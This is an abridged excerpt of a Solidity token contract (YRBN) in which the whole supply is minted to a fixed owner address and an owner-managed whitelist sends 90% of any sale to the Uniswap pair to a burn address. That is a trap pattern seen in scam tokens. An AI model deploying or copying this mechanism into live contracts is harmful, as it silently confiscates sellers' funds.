...
contract YRBN is Context, IERC20,Ownable {
    ...
    address public ownerAddress = address(0x473E4B83ebB257df6e12fB492cFFD4794dDEA7C5);


    uint256 private destoryFee =10;
    ...
    constructor () {
        ...
        _symbol = "YRBN";
        _decimals = 18;
        uint256 totalAmount = 1000000000 * 10 ** _decimals;
        _totalSupply = _totalSupply.add(totalAmount);
        _mint(ownerAddress, totalAmount);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
            ...
            if(_isWhitelisted[sender] || _isWhitelisted[recipient]){
                ...
                if(recipient == _uniswapV2Pair){
                    _tf(sender,recipient,amount.mul(10).div(100));
                    _tf(sender,_destroyAddress,amount.mul(90).div(100));
                }else{
                    _tf(sender,recipient,amount);
                }
    ...
    function addWhiteAddress(address account, bool value) public  onlyOwner {
